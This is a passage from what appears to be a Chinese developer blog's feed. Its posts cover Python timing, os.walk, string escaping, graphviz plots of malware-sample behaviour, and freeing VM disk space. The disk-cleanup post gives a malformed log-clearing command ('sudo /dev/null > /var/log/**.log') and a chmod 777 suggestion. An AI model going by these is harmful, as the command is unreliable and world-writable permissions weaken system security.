class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># start = time.clock()</span></span><br><span class="line">start = time.perf_counter()</span><br><span class="line"><span class="comment">#long running</span></span><br><span class="line"><span class="comment">#do something other</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">1e8</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"><span class="comment"># end = time.clock()</span></span><br><span class="line">end = time.perf_counter()</span><br><span class="line">print(end - start)  <span class="comment">#秒</span></span><br></pre></td></tr></table></figure><p><code>time.clock()</code>返回程序开始或第一次被调用<code>clock()</code>以来的CPU时间。 这具有与系统记录一样多的精度。返回的也是一个浮点类型。这里获得的是<strong>CPU的执行时间</strong>。</p><p>python3.8+ 不支持 clock 了，替换成 <code>time.perf_counter()</code> 就可以了</p><p><font color="red"><strong>注意</strong></font>：程序执行时间=cpu时间 + io时间 + 休眠或者等待时间</p><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://blog.csdn.net/wangshuang1631/article/details/54286551" target="_blank" rel="noopener">几种Python执行时间的计算方法</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python-os模块-遍历文件夹下的所有文件</title>
      <link href="/2022/02/09/Python-os%E6%A8%A1%E5%9D%97-%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8B%E7%9A%84%E6%89%80%E6%9C%89%E6%96%87%E4%BB%B6/"/>
      <url>/2022/02/09/Python-os%E6%A8%A1%E5%9D%97-%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8B%E7%9A%84%E6%89%80%E6%9C%89%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-问题引入"><a class="markdownIt-Anchor" href="#1-问题引入"></a> 1 问题引入</h1><p>最近在实现恶意脚本的可视化，需要实现提取文件夹下的所有文件名，实现脚本自动化。</p><h1 id="2-文件夹下只有文件"><a class="markdownIt-Anchor" href="#2-文件夹下只有文件"></a> 2 文件夹下只有文件</h1><p>当目标文件夹中只有文件时，使用os模块的<code>listdir()</code>方法即可：该方法可以返回目标路径下的文件和文件夹的名字列表，参数就是目标路径。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">file_names = os.listdir(<span class="string">r'test'</span>)</span><br><span class="line">print(file_names)  <span class="comment"># ['1.txt', '2.txt', '3.txt']</span></span><br></pre></td></tr></table></figure><h1 id="3-文件夹下有文件和文件夹"><a class="markdownIt-Anchor" href="#3-文件夹下有文件和文件夹"></a> 3 文件夹下有文件和文件夹</h1><p>当目标文件中既有文件又有文件夹时，我们使用<code>listdir()</code>方法就只能获得第一层子文件或文件夹了，而子文件夹中的内容便获取不到了。</p><p>这时候我们需要用到<code>os.walk()</code>方法：传入目标路径即可。该方法可以递归的找出目标路径下的所有文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">file_names = os.listdir(<span class="string">r'test'</span>)</span><br><span class="line">print(file_names)  <span class="comment"># ['1.txt', '2.txt', '3.txt', 'sub-dir']</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> filepath, dirnames, filenames <span class="keyword">in</span> os.walk(<span class="string">r'test'</span>):</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> filenames:</span><br><span class="line">        print(filename)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">1.txt</span></span><br><span class="line"><span class="string">2.txt</span></span><br><span class="line"><span class="string">3.txt</span></span><br><span class="line"><span class="string">4.txt</span></span><br><span class="line"><span class="string">5.txt</span></span><br><span class="line"><span class="string">6.txt</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><hr><p><code>os.walk()</code>方法可以生成三元组，也就是我们代码中的<code>filepath</code>，<code>dirnames</code>，<code>filenames</code>。我们将他们分别打印出来可以看到：其中<code>filepath</code>就是目标路径下所有文件的路径，<code>dirnames</code>是我们目标路径的所有目录名称，<code>filenames</code>则是各个路径下的文件名称列表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> filepath, dirnames, filenames <span class="keyword">in</span> os.walk(<span class="string">r'test'</span>):</span><br><span class="line">    print(filepath)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">test</span></span><br><span class="line"><span class="string">test\sub-dir</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">for</span> filepath, dirnames, filenames <span class="keyword">in</span> os.walk(<span class="string">r'test'</span>):</span><br><span class="line">    print(dirnames)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">['sub-dir']</span></span><br><span class="line"><span class="string">[]</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">for</span> filepath, dirnames, filenames <span class="keyword">in</span> os.walk(<span class="string">r'test'</span>):</span><br><span class="line">    print(filenames)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">['1.txt', '2.txt', '3.txt']</span></span><br><span class="line"><span class="string">['4.txt', '5.txt', '6.txt']</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><h1 id="4-拓展获得目标路径下的所有文件的绝对路径"><a class="markdownIt-Anchor" href="#4-拓展获得目标路径下的所有文件的绝对路径"></a> 4 拓展—获得目标路径下的所有文件的绝对路径</h1><p>遍历目标路径下的各个文件，用<code>os.path.join()</code>方法将文件路径和文件名拼接在一起，就是各个文件的绝对路径了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> filepath, dirnames, filenames <span class="keyword">in</span> os.walk(<span class="string">r'test'</span>):</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> filenames:</span><br><span class="line">        print(os.path.join(filepath, filename))</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">test\1.txt</span></span><br><span class="line"><span class="string">test\2.txt</span></span><br><span class="line"><span class="string">test\3.txt</span></span><br><span class="line"><span class="string">test\sub-dir\4.txt</span></span><br><span class="line"><span class="string">test\sub-dir\5.txt</span></span><br><span class="line"><span class="string">test\sub-dir\6.txt</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://blog.csdn.net/qq_39721240/article/details/90704223" target="_blank" rel="noopener">python遍历文件夹下的所有文件</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python-字符串-防止转义</title>
      <link href="/2022/02/09/Python-%E5%AD%97%E7%AC%A6%E4%B8%B2-%E9%98%B2%E6%AD%A2%E8%BD%AC%E4%B9%89/"/>
      <url>/2022/02/09/Python-%E5%AD%97%E7%AC%A6%E4%B8%B2-%E9%98%B2%E6%AD%A2%E8%BD%AC%E4%B9%89/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-问题引入"><a class="markdownIt-Anchor" href="#1-问题引入"></a> 1 问题引入</h1><p>最近在做xml解析、可视化时遇到一个问题：将字符串（文件路径）中的转义字符不进行转义<code>123\tabc</code>，正常print会将<code>\t</code>看作转义字符tab，需求是使字符串按原样输出。下面是不同场景下的解决方法：</p><h1 id="2-字符串常量"><a class="markdownIt-Anchor" href="#2-字符串常量"></a> 2 字符串常量</h1><p>如果是字符串常量，则在字符串前加<code>r</code> 即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"123\tabc"</span>)</span><br><span class="line"><span class="comment"># 123abc</span></span><br><span class="line">print(<span class="string">r"123\tabc"</span>)  <span class="comment"># test_str = r"123\tabc"</span></span><br><span class="line"><span class="comment"># 123\tabc</span></span><br></pre></td></tr></table></figure><h1 id="3-字符串变量"><a class="markdownIt-Anchor" href="#3-字符串变量"></a> 3 字符串变量</h1><p>如果字符串是变量，使用 <code>repr()</code> 方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="string">"123\tabc"</span></span><br><span class="line">str2 = repr(str1)</span><br><span class="line"></span><br><span class="line">print(str1)  <span class="comment"># 123abc</span></span><br><span class="line">print(str2)  <span class="comment"># '123\tabc'</span></span><br><span class="line">print(str2.strip(<span class="string">"\'"</span>))  <span class="comment"># 123\tabc</span></span><br></pre></td></tr></table></figure><p><font color="red"><strong>注意</strong></font>：字符串使用 <code>repr</code> 函数后输出是会在字符串前后自动加上单引号（见print第二行），print第三行是去掉了字符串首尾的单引号。关于<code>strip</code>函数，详见<a href="https://dragonliu.tk/2022/02/09/python%E5%8E%BB%E9%99%A4%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A6%96%E5%B0%BE%E7%9A%84%E7%A9%BA%E6%A0%BC/" target="_blank" rel="noopener">博客</a>。</p><h1 id="4-文件读取"><a class="markdownIt-Anchor" href="#4-文件读取"></a> 4 文件读取</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file1 = open(<span class="string">"test.txt"</span>, <span class="string">"r"</span>)  <span class="comment"># 123\tabc</span></span><br><span class="line"></span><br><span class="line">print(file1.read())  <span class="comment"># 123\tabc</span></span><br></pre></td></tr></table></figure><p>文本文件读取测试发现字符串未发生转义。</p><p>拓展阅读：<a href="https://blog.csdn.net/ahalearner/article/details/119777972" target="_blank" rel="noopener">关于python中open函数读取和写入windows记事本的换行问题研究</a></p><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://www.cnblogs.com/hellofengying/p/10183057.html" target="_blank" rel="noopener">python中防止字符串转义</a></li><li><a href="https://blog.csdn.net/weixin_41813169/article/details/105702294" target="_blank" rel="noopener">python如何实现对变量的禁止转义操作</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python-graphviz模块-使用教程</title>
      <link href="/2022/02/03/Python-graphviz%E6%A8%A1%E5%9D%97-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
      <url>/2022/02/03/Python-graphviz%E6%A8%A1%E5%9D%97-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-情景引入"><a class="markdownIt-Anchor" href="#1-情景引入"></a> 1 情景引入</h1><p>前几个月师姐给了个任务——恶意样本行为可视化，输入为xml文件，一个文件代表一个恶意样本。请教学姐学长同学等，加上观看效果图，得出实现思路：python解析xml文件，使用python模块graphviz进行可视化；之后使用图数据库neo4j进行对比。</p><p>之后发现neo4j创建多个图数据库比较麻烦，但是按照行为分类等都比较直观，所以做辅助作用应该不错。</p><img src="https://s2.loli.net/2022/02/10/jnNf9Xrms8CYgxz.png" width="600" height="400" alt="图片名称" align="center" id="65"><p>下面对graphviz进行整理。</p><h1 id="2-graphviz"><a class="markdownIt-Anchor" href="#2-graphviz"></a> 2 Graphviz</h1><p>Graphviz 是一个自动排版的作图软件，可以生成 png pdf 等格式。</p><ul><li><a href="https://graphviz.org/documentation/" target="_blank" rel="noopener">Graphviz官网</a></li><li><a href="https://www.cnblogs.com/shuqin/p/11897207.html" target="_blank" rel="noopener">Graphviz 画图的一些总结</a></li></ul><h1 id="3-python-graphviz"><a class="markdownIt-Anchor" href="#3-python-graphviz"></a> 3 python graphviz</h1><p>python graphviz则是graphviz的python实现。我们可以通过python graphviz实现轻松完成各种流程图的绘制。</p><ul><li><a href="https://graphviz.readthedocs.io/en/stable/manual.html" target="_blank" rel="noopener">python graphviz官方文档</a></li><li><a href="https://blog.csdn.net/LuohenYJ/article/details/106172201" target="_blank" rel="noopener">[python] python模块graphviz使用入门</a></li></ul><h2 id="31-安装"><a class="markdownIt-Anchor" href="#31-安装"></a> 3.1 安装</h2><ol><li><p>安装python graphviz木块（本机使用的是python3.9）:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install graphviz</span><br></pre></td></tr></table></figure></li><li><p>除了python安装外，本机还需要安装Graphviz<a href="https://www.graphviz.org/download/" target="_blank" rel="noopener">(下载页面)</a>，并确保包含dot可执行文件的目录在系统路径上。安装过程中需要添加PATH：</p><img src="https://s2.loli.net/2022/02/10/mJkzIuyaMLCQbAS.png" width="400" height="300" alt="图片名称" align="center" id="35"><p>否则出现下面的报错：(重启Pycharm生效)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">graphviz.backend.execute.ExecutableNotFound: failed to execute WindowsPath(<span class="string">'dot'</span>), make sure the Graphviz executables are on your systems<span class="string">' PATH</span></span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/lizzy05/article/details/88529030" target="_blank" rel="noopener">graphviz.backend.ExecutableNotFound: failed to execute [‘dot’, ‘-Tpng’, ‘-O’, ‘t est.gv’]问题解决方法</a></p><p>解决报错：添加环境变量</p><img src="https://s2.loli.net/2022/02/10/Nbm9RlSDYFyxtZX.png" width="800" height="400" alt="图片名称" align="center" id="66"></li></ol><h2 id="32-使用"><a class="markdownIt-Anchor" href="#32-使用"></a> 3.2 使用</h2><p>该graphviz模块提供了两个类：Graph和 Digraph。它们分别以DOT语言为无向图和有向图创建图描述。它们具有相同的 API。示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> graphviz <span class="keyword">import</span> Digraph</span><br><span class="line"></span><br><span class="line">dot = Digraph(comment=<span class="string">'恶意样本行为可视化'</span>, format=<span class="string">'jpg'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化端点</span></span><br><span class="line">dot.node(name=<span class="string">'n1'</span>, label=<span class="string">'端点A'</span>, color=<span class="string">"#008000"</span>, fontcolor=<span class="string">"#000000"</span>, style=<span class="string">"filled"</span>, shape=<span class="string">"rectangle"</span>, fontname=<span class="string">"Microsoft YaHei"</span>)</span><br><span class="line">dot.node(name=<span class="string">'n2'</span>, label=<span class="string">'端点B'</span>, color=<span class="string">"#FFD700"</span>, fontcolor=<span class="string">"#000000"</span>, style=<span class="string">"filled"</span>, shape=<span class="string">"circle"</span>, fontname=<span class="string">"Microsoft YaHei"</span>)</span><br><span class="line">dot.node(name=<span class="string">'n3'</span>, label=<span class="string">'端点C'</span>, color=<span class="string">"#0000FF"</span>, fontcolor=<span class="string">"#FFFFFF"</span>, style=<span class="string">"filled"</span>, shape=<span class="string">"oval"</span>, fontname=<span class="string">"Microsoft YaHei"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 布局 L-左 R-右 T-上 B-下</span></span><br><span class="line">dot.attr(rankdir=<span class="string">'LR'</span>)  <span class="comment"># 自左向右</span></span><br><span class="line"><span class="comment"># dot.attr(rankdir='RL')</span></span><br><span class="line"><span class="comment"># dot.attr(rankdir='TB')  # 默认</span></span><br><span class="line"><span class="comment"># dot.attr(rankdir='BT')</span></span><br><span class="line"><span class="comment"># 初始化边</span></span><br><span class="line">dot.edge(<span class="string">'n1'</span>, <span class="string">'n2'</span>, label=<span class="string">"边1"</span>, color=<span class="string">"#000000"</span>, fontcolor=<span class="string">"#000000"</span>, style=<span class="string">""</span>, fontname=<span class="string">"Microsoft YaHei"</span>)</span><br><span class="line">dot.edge(<span class="string">'n1'</span>, <span class="string">'n3'</span>, label=<span class="string">"边2"</span>, color=<span class="string">"#FF0000"</span>, fontcolor=<span class="string">"#FF0000"</span>, style=<span class="string">"dashed"</span>, fontname=<span class="string">"Microsoft YaHei"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存文件，view=False时将不自动打开文件</span></span><br><span class="line"><span class="comment"># dot.render("test_graphviz.gv", format='jpg', view=True)</span></span><br><span class="line"><span class="comment"># 不保存文件，仅仅自动打开</span></span><br><span class="line">u = dot.unflatten(stagger=<span class="number">1</span>)</span><br><span class="line">u.view()</span><br></pre></td></tr></table></figure><p>显示如下：</p><img src="https://s2.loli.net/2022/02/10/hID7tuFsmfijoQv.png" width="400" height="300" alt="图片名称" align="center" id="67"><h2 id="33-中文乱码"><a class="markdownIt-Anchor" href="#33-中文乱码"></a> 3.3 中文乱码</h2><p>如果出现中文乱码，多半是因为没有设置fontname为支持中文显示的字体，只需要在node或者edge中添加<code>fontname=&quot;Microsoft YaHei&quot;</code>，即可正常显示。</p><ul><li><a href="https://blog.csdn.net/MAILLIBIN/article/details/100581857" target="_blank" rel="noopener">参考</a></li></ul><h2 id="34-端点-边-字体颜色"><a class="markdownIt-Anchor" href="#34-端点-边-字体颜色"></a> 3.4 端点、边、字体颜色</h2><p>在node或者edge中添加<code>color=&quot;#000000&quot;, fontcolor=&quot;#000000&quot;</code>即可，具体颜色可以参考：</p><ul><li><a href="https://graphviz.gitlab.io/doc/info/colors.html" target="_blank" rel="noopener">官网颜色</a></li><li><a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E9%A1%B5%E9%A2%9C%E8%89%B2" target="_blank" rel="noopener">维基百科——X11名称编码</a></li></ul><h2 id="35-端点的形状"><a class="markdownIt-Anchor" href="#35-端点的形状"></a> 3.5 端点的形状</h2><p>在node中添加<code>shape=&quot;xxx&quot;</code>即可，具体需要什么形状可以在<a href="https://graphviz.gitlab.io/doc/info/shapes.html" target="_blank" rel="noopener">官网</a>中查找。</p><h2 id="36-rank"><a class="markdownIt-Anchor" href="#36-rank"></a> 3.6 Rank</h2><p><a href="https://blog.csdn.net/youwen21/article/details/98397954" target="_blank" rel="noopener">GraphViz DOT有向图 (四)node节点布局控制之rank,group,subgraph</a></p><h2 id="37-排版"><a class="markdownIt-Anchor" href="#37-排版"></a> 3.7 排版</h2><p>如上面的示例，使用<code>dot.attr(rankdir='xx')</code>来确定排版，作用范围为使用该行代码之后，下一个<code>dot.attr(rankdir='xx')</code>代码之前。</p><h2 id="38-name参数中不能有英文冒号"><a class="markdownIt-Anchor" href="#38-name参数中不能有英文冒号"></a> 3.8 name参数中不能有英文冒号</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dot.node(name=<span class="string">'n1'</span>, label=<span class="string">'n1'</span>)</span><br><span class="line">dot.node(name=<span class="string">'n2:3'</span>, label=<span class="string">'n2:3'</span>)</span><br><span class="line">dot.edge(<span class="string">'n1'</span>, <span class="string">'n2:3'</span>)</span><br></pre></td></tr></table></figure><p><code>dot.node(name=&quot;xxx&quot;)</code> 如果name参数含有英文逗号，则会报错，导致画图错误：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: node n2, port 3 unrecognized</span><br></pre></td></tr></table></figure><p>常见的思路是使用python将name参数改成中文冒号，label参数是原来的英文冒号，达到正确显示的目的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string = <span class="string">"http://gsstudio.info/panel"</span></span><br><span class="line">label = repr(string)</span><br><span class="line">name = repr(string.replace(<span class="string">":"</span>, <span class="string">"："</span>))</span><br></pre></td></tr></table></figure><p><code>repr</code>函数是防止字符串转义的，详细见<a href="dragonliu.tk/2022/02/09/python%E4%B8%AD%E9%98%B2%E6%AD%A2%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E4%B9%89/">博客——python中防止字符串转义</a>。</p><h2 id="39-报错graphvizbackendexecutecalledprocesserror"><a class="markdownIt-Anchor" href="#39-报错graphvizbackendexecutecalledprocesserror"></a> 3.9 报错：graphviz.backend.execute.CalledProcessError</h2><p><strong>报错信息：</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">subprocess.CalledProcessError: Command <span class="string">'[WindowsPath('</span>dot<span class="string">'), '</span>-Kdot<span class="string">', '</span>-Tjpg<span class="string">', '</span>-O<span class="string">', '</span>57630-0.xml.gv<span class="string">']'</span> returned non-zero <span class="built_in">exit</span> status 3221225477.</span><br><span class="line">...</span><br><span class="line">graphviz.backend.execute.CalledProcessError: Command <span class="string">'[WindowsPath('</span>dot<span class="string">'), '</span>-Kdot<span class="string">', '</span>-Tjpg<span class="string">', '</span>-O<span class="string">', '</span>57630-0.xml.gv<span class="string">']'</span> returned non-zero <span class="built_in">exit</span> status 3221225477. [stderr: b<span class="string">'dot: graph is too large for cairo-renderer bitmaps. Scaling by 0.876568 to fit\r\n'</span>]</span><br></pre></td></tr></table></figure><p><strong>现象：</strong></p><p><code>.gv</code>文件可以正常生成，图片文件<code>.jpg</code>无法生成。</p><p>定位报错语句：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dot = Digraph(comment=<span class="string">'恶意样本行为可视化'</span>, format=<span class="string">'jpg'</span>)</span><br><span class="line">...</span><br><span class="line">dot.render(output_dir + <span class="string">"\\"</span> + file_name + <span class="string">".gv"</span>, format=<span class="string">'jpg'</span>)</span><br></pre></td></tr></table></figure><p><strong>原因：</strong></p><p>生成的graph太大，dot无法导出，换成<code>pdf</code>或<code>svg</code>就可以了，<code>png</code>和<code>jpg</code>都不行。</p><p>最后选择pdf格式，因为导出的文件小。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dot = Digraph(comment=<span class="string">'恶意样本行为可视化'</span>, format=<span class="string">'pdf'</span>)</span><br><span class="line">...</span><br><span class="line">dot.render(output_dir + <span class="string">"\\"</span> + file_name + <span class="string">".gv"</span>, format=<span class="string">'pdf'</span>)</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/02/12/59CK8EwoYSsyNiJ.png" width="900" height="200" alt="图片名称" align="center" id="76"><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>VMWare虚拟机Ubuntu20.04 LTS磁盘空间不足的解决方法整理</title>
      <link href="/2022/02/02/VMWare%E8%99%9A%E6%8B%9F%E6%9C%BAUbuntu20-04-LTS%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E4%B8%8D%E8%B6%B3%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"/>
      <url>/2022/02/02/VMWare%E8%99%9A%E6%8B%9F%E6%9C%BAUbuntu20-04-LTS%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E4%B8%8D%E8%B6%B3%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引入"><a class="markdownIt-Anchor" href="#1-引入"></a> 1 引入</h1><p>之前设置磁盘大小为40G，现在搭建cuckoo环境，磁盘空间不足。</p><p>在Ubuntu虚拟机的命令行输入 <code>df -l</code> 查看磁盘使用情况：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop df -l</span><br><span class="line">Filesystem     1K-blocks     Used Available Use% Mounted on</span><br><span class="line">udev             4019184        0   4019184   0% /dev</span><br><span class="line">tmpfs             810936     2032    808904   1% /run</span><br><span class="line">/dev/sda5      102431704 46674596  51153504  99% /</span><br></pre></td></tr></table></figure><p>可以看到 <code>/dev/sda5</code> 对应的根目录 <code>/</code> 已经满载了。</p><p>下面是一些解决方法：</p><h1 id="2-删除回收站所有文件"><a class="markdownIt-Anchor" href="#2-删除回收站所有文件"></a> 2 删除回收站所有文件</h1><p>使用下面命令即可：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -rf ~/.<span class="built_in">local</span>/share/Trash/</span><br></pre></td></tr></table></figure><h1 id="3-删除日志文件"><a class="markdownIt-Anchor" href="#3-删除日志文件"></a> 3 删除日志文件</h1><p>删除所有日志文件：（可能存在权限不够，无法删除的情况）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /dev/null &gt; /var/<span class="built_in">log</span>/**.<span class="built_in">log</span></span><br></pre></td></tr></table></figure><p>下面这个可以推荐使用：（删除30天之前的旧文件）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /var/<span class="built_in">log</span>/ -<span class="built_in">type</span> f -mtime +30 -<span class="built_in">exec</span> rm -f &#123;&#125; \;</span><br></pre></td></tr></table></figure><h1 id="4-删除快照对磁盘空间大小无影响"><a class="markdownIt-Anchor" href="#4-删除快照对磁盘空间大小无影响"></a> 4 删除快照（对磁盘空间大小无影响）</h1><p>但是对于Ubuntu虚拟机整体目录大小有关。</p><h1 id="5-删除无关用户"><a class="markdownIt-Anchor" href="#5-删除无关用户"></a> 5 删除无关用户</h1><p>使用下面命令即可：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo userdel -r &lt;newuser&gt;</span><br></pre></td></tr></table></figure><h1 id="6-挂载新磁盘"><a class="markdownIt-Anchor" href="#6-挂载新磁盘"></a> 6 挂载新磁盘</h1><p>拓展磁盘空间：<a href="https://blog.csdn.net/weixin_40641735/article/details/88932720" target="_blank" rel="noopener">链接</a></p><p>设置挂载的文件夹访问权限：<code>sudo chmod 777 ×××</code> （每个人都有读和写以及执行的权限）</p><h1 id="7-拓展磁盘空间不改变原有磁盘内容推荐"><a class="markdownIt-Anchor" href="#7-拓展磁盘空间不改变原有磁盘内容推荐"></a> 7  拓展磁盘空间（不改变原有磁盘内容，推荐）</h1><p><a 